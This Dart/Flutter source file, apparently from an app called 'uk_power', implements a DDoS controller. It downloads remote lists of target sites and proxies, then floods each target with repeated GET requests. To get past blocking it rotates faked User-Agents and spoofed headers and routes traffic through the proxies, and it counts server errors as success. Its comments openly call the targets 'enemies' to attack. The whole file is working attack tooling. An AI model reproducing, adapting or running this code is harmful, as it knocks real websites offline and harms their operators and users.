import 'dart:async';
import 'dart:convert';
import 'dart:ffi';
import 'dart:io';

import 'package:flutter/foundation.dart';

import 'package:dio/dio.dart';
import 'package:dio/adapter.dart';
import 'package:faker/faker.dart';
import 'package:logger/logger.dart';

import 'package:uk_power/utils/constants.dart';
import 'package:uk_power/models/ddos_info.dart';

class Proxy {
  String ip;
  String port;
  String? auth;

  Proxy({
    required this.ip,
    required this.port,
    this.auth,
  });

  @override
  String toString() {
    if (auth == null || auth!.isEmpty) return "PROXY $ip:$port";
    return "PROXY $ip:$port//$auth";
  }
}

class DDOSController {
  List<String> hosts = [];
  List<String> directTargets = [];
  Dio dio = Dio();
  final int maxIterations = 50;

  /// Init hosts and direct targets
  Future<void> init(void Function(DDOSInfo) callback) async {
    try {
      callback(await _getHosts());
      await Future.delayed(const Duration(seconds: 1));
      callback(await _getDirectTargets());
    } catch (ex) {
      Logger().e(ex.toString());
      callback(
        DDOSInfo(
          status: DDOSStatus.error,
          msg: initError + ex.toString(),
          dateTime: DateTime.now(),
          responseCode: 503,
        ),
      );
    }
  }

  Future<DDOSInfo> _getHosts() async {
    try {
      Response response = await dio.getUri(Uri.parse(apiURL));
      String body = "";

      try {
        body = response.data.toString();
      } catch (ex) {
        Logger().e(ex.toString());
        return DDOSInfo(
          msg: invalidBodyError + ex.toString(),
          responseCode: 503,
          status: DDOSStatus.error,
          dateTime: DateTime.now(),
        );
      }

      // remove all trash and spaces
      body = body.replaceAll("[", "").replaceAll("]", "");
      body = body.replaceAll("\"", "").replaceAll("\n", "").trim();

      // lets split all urls and save them
      List<String> split = body.split(", ");
      for (String url in split) {
        hosts.add(url.trim());
      }

      return DDOSInfo(
        msg: hostsConnected.replaceAll("COUNT", hosts.length.toString()),
        responseCode: response.statusCode!,
        status: DDOSStatus.success,
        dateTime: DateTime.now(),
      );
    } catch (ex) {
      Logger().e(ex.toString());
      return DDOSInfo(
        msg: tryAgainHosts + ex.toString(),
        responseCode: 503,
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
        target: Uri(),
      );
    }
  }

  Future<DDOSInfo> _getDirectTargets() async {
    try {
      Response response = await dio.getUri(Uri.parse(sourceURL));
      String body = "";

      try {
        body = response.data.toString();
      } catch (ex) {
        Logger().e(ex.toString());
        return DDOSInfo(
          msg: invalidBodyError + ex.toString(),
          responseCode: 503,
          status: DDOSStatus.error,
          dateTime: DateTime.now(),
        );
      }

      // lets split all urls and save them
      List<String> split = body.split("\n");
      for (String url in split) {
        if (url.isNotEmpty) directTargets.add(url.trim());
      }

      return DDOSInfo(
        msg: directFound.replaceAll("COUNT", directTargets.length.toString()),
        responseCode: response.statusCode!,
        status: DDOSStatus.success,
        dateTime: DateTime.now(),
      );
    } catch (ex) {
      Logger().e(ex.toString());
      return DDOSInfo(
        msg: tryAgainDirect + ex.toString(),
        responseCode: 503,
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
      );
    }
  }

  Future<List<Proxy>> _getProxies() async {
    List<Proxy> proxies = [];

    try {
      Response response = await dio.getUri(Uri.parse(proxySource));
      Map<String, dynamic> jsonData = {};

      try {
        jsonData = response.data;
      } catch (ex) {
        Logger().e(ex.toString());
      }

      var data = jsonData['data'];
      for (var item in data) {
        String ip = item['ip'];
        String port = item['port'];
        proxies.add(
          Proxy(
            ip: ip,
            port: port,
          ),
        );
      }
    } catch (ex) {
      Logger().e(ex.toString());
    }

    return proxies;
  }

  String _formateURL(String url) {
    if (!url.startsWith("http")) {
      url = "https://$url";
    }
    return url;
  }

  List<Proxy> _formateProxy(List<dynamic> proxiesRaw) {
    List<Proxy> proxies = [];

    for (var proxy in proxiesRaw) {
      String ip = proxy['ip'];
      String port = ip.replaceRange(0, ip.indexOf(":") + 1, "");
      ip = ip.replaceRange(ip.indexOf(":"), ip.length, "");

      proxies.add(
        Proxy(
          ip: ip,
          port: port,
          auth: proxy['auth'],
        ),
      );
    }

    return proxies;
  }

  /// Танцюймо наш герць
  Future<void> dance(void Function(DDOSInfo) callback) async {
    // create headers
    Map<String, String> headers = {
      'Content-Type': 'application/json; text/html; charset=UTF-8',
      'cf-visitor': 'https',
      'User-Agent': faker.internet.userAgent(),
      'Connection': 'keep-alive',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'ru',
      'x-forwarded-proto': 'https',
      'Accept-Encoding': 'gzip, deflate, br',
    };

    if (hosts.isNotEmpty) {
      _attackUsingHosts((info) => callback(info), headers);
    }

    if (directTargets.isNotEmpty) {
      await _attackUsingTargets((info) => callback(info), headers);
    }
  }

  Future<void> _attackUsingHosts(
    void Function(DDOSInfo) callback,
    Map<String, String> headers,
  ) async {
    await Future.delayed(const Duration(seconds: 1));

    hosts.shuffle();

    for (String host in hosts) {
      try {
        // request target from host
        Response response = await dio.getUri(
          Uri.parse(host),
          options: Options(
            headers: headers,
          ),
        );
        // try get response
        String body = "";
        Map<String, dynamic> jsonData = {};

        try {
          body = response.data.toString();
          jsonData = jsonDecode(utf8.decode(utf8.encode(body)));
        } catch (ex) {
          Logger().e(ex.toString());
          callback(
            DDOSInfo(
              msg: invalidBodyError + ex.toString(),
              responseCode: response.statusCode!,
              target: kDebugMode ? Uri.parse(host) : null,
              status: DDOSStatus.error,
              dateTime: DateTime.now(),
            ),
          );
          continue;
        }

        // get target info
        var site = jsonData['site'];
        List<Proxy> proxies = _formateProxy(jsonData['proxy']);
        String target = _formateURL(site['page']);

        // update header
        headers['User-Agent'] = faker.internet.userAgent();
        // try attack enemies
        try {
          await _attackTarget(
            (info) {
              callback(info);
            },
            Uri.parse(target),
            headers,
            proxies,
          );
        } catch (ex) {
          Logger().e(ex.toString());
          callback(
            DDOSInfo(
              msg: ex.toString(),
              responseCode: 503,
              status: DDOSStatus.error,
              dateTime: DateTime.now(),
              target: Uri.parse(target),
            ),
          );
          continue;
        }
      } catch (ex) {
        Logger().e(ex.toString());
        callback(
          DDOSInfo(
            msg: hostsKW + ex.toString(),
            responseCode: 0,
            status: DDOSStatus.error,
            dateTime: DateTime.now(),
          ),
        );
        continue;
      }
    }
  }

  Future<void> _attackUsingTargets(
    void Function(DDOSInfo) callback,
    Map<String, String> headers,
  ) async {
    await Future.delayed(const Duration(seconds: 1));

    // need proxies
    List<Proxy> proxies = await _getProxies();
    // let's shuffle them
    proxies.shuffle();
    directTargets.shuffle();

    for (String target in directTargets) {
      try {
        // and lets attack a-a-a-a-a-a-all of those mthfks
        await _attackTarget(
          (info) {
            callback(info);
          },
          Uri.parse(_formateURL(target)),
          headers,
          proxies,
        );
      } catch (ex) {
        Logger().e(ex.toString());
        callback(
          DDOSInfo(
            msg: directKW + ex.toString(),
            responseCode: 0,
            status: DDOSStatus.error,
            dateTime: DateTime.now(),
          ),
        );
        continue;
      }
    }
  }

  Future<void> _attackTarget(
    void Function(DDOSInfo) callback,
    Uri target,
    Map<String, String> headers,
    List<Proxy> proxies,
  ) async {
    dio = Dio();
    Response? response;
    try {
      response = await dio
          .getUri(
            target,
            options: Options(
              headers: headers,
            ),
          )
          .timeout(
            timeout,
            onTimeout: () => throw TimeoutException(
              timeoutError.replaceAll(
                "COUNT",
                timeout.inSeconds.toString(),
              ),
            ),
          );

      // lets use proxies
      if (response.statusCode! >= 302 && response.statusCode! >= 200) {
        for (Proxy proxy in proxies) {
          // update headers
          headers['User-Agent'] = faker.internet.userAgent();
          // apply proxy
          (dio.httpClientAdapter as DefaultHttpClientAdapter)
              .onHttpClientCreate = (client) {
            client.findProxy = (uri) {
              return proxy.toString();
            };
            return HttpClient();
          };

          dio.options.headers = headers;
          var dioResponse = await dio
              .getUri(
                target,
              )
              .timeout(
                timeout,
                onTimeout: () => throw TimeoutException(
                  timeoutProxyError.replaceAll(
                    "COUNT",
                    timeout.inSeconds.toString(),
                  ),
                ),
              );

          if (dioResponse.statusCode! >= 200 &&
              dioResponse.statusCode! <= 302) {
            for (int i = 0; i < maxIterations; ++i) {
              dioResponse = await dio
                  .getUri(
                    target,
                  )
                  .timeout(
                    timeout,
                    onTimeout: () => throw TimeoutException(
                      timeoutProxyError.replaceAll(
                        "COUNT",
                        timeout.inSeconds.toString(),
                      ),
                    ),
                  );

              callback(
                DDOSInfo(
                  msg: successProxy,
                  target: target,
                  dateTime: DateTime.now(),
                  responseCode: dioResponse.statusCode ?? -1,
                  status: DDOSStatus.attack,
                ),
              );
            }
          }
        }
      }
      // lets dance
      else {
        for (int i = 0; i < maxIterations; ++i) {
          // update headers
          headers['User-Agent'] = faker.internet.userAgent();
          response = await dio
              .getUri(
                target,
                options: Options(
                  headers: headers,
                ),
              )
              .timeout(
                timeout,
                onTimeout: () => throw TimeoutException(
                  timeoutError.replaceAll(
                    "COUNT",
                    timeout.inSeconds.toString(),
                  ),
                ),
              );

          callback(
            DDOSInfo(
              msg: success,
              target: target,
              dateTime: DateTime.now(),
              responseCode: response.statusCode!,
              status: DDOSStatus.attack,
            ),
          );
        }
      }
    } catch (ex) {
      Logger().e(ex.toString());
      DDOSStatus status = DDOSStatus.error;

      if (ex is DioError) {
        String exStr = ex.message;

        if (exStr.contains("Http status error")) {
          String temp = exStr
              .replaceRange(0, exStr.indexOf("[") + 1, "")
              .replaceAll("]", "")
              .trim();

          int code = int.tryParse(temp) ?? 0;

          if (code >= 500) {
            status = DDOSStatus.success;
          } else if (code >= 400) {
            status = DDOSStatus.attack;
          }
        }
      }

      callback(
        DDOSInfo(
          msg: ex.toString(),
          target: target,
          dateTime: DateTime.now(),
          responseCode: response?.statusCode ?? -1,
          status: status,
        ),
      );
    }
  }
}
